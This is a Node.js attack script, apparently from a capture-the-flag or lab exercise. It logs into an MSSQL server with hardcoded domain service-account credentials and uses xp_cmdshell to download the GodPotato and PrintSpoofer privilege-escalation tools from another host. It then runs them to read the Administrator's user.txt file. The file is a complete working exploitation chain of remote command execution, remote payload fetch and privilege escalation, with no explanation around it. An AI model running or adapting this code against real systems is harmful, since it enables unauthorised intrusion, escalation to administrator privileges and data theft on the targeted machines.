const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true, enableArithAbort: true },
    port: 1433,
  });
  const q = async (s) => {
    try {
      const r = await sql.query(s);
      console.log("=>", JSON.stringify(r.recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  const base = "http://172.16.0.12:8080";
  // discover web IP via hosts if needed - try both
  for (const host of ["172.16.0.12", "10.129.115.125"]) {
    await q(
      `EXEC xp_cmdshell 'powershell -c \"try { (Invoke-WebRequest -Uri http://${host}:8080/GodPotato-NET35.exe -OutFile C:/Users/Public/gp.exe -UseBasicParsing).StatusCode } catch { $_.Exception.Message }\"'`
    );
  }
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public\\gp.exe'");
  await q(
    "EXEC xp_cmdshell 'C:\\Users\\Public\\gp.exe -cmd \"cmd /c whoami > C:\\Users\\Public\\who.txt & type C:\\Users\\Administrator\\Desktop\\user.txt > C:\\Users\\Public\\uf.txt\"'"
  );
  await q("EXEC xp_cmdshell 'type C:\\Users\\Public\\who.txt'");
  await q("EXEC xp_cmdshell 'type C:\\Users\\Public\\uf.txt'");
  // PrintSpoofer fallback
  await q(
    `EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://172.16.0.12:8080/PrintSpoofer.exe -OutFile C:/Users/Public/ps.exe -UseBasicParsing\"'`
  );
  await q(
    "EXEC xp_cmdshell 'C:\\Users\\Public\\ps.exe -c \"cmd /c type C:\\Users\\Administrator\\Desktop\\user.txt > C:\\Users\\Public\\uf2.txt\"'"
  );
  await q("EXEC xp_cmdshell 'type C:\\Users\\Public\\uf2.txt'");
  process.exit(0);
})();
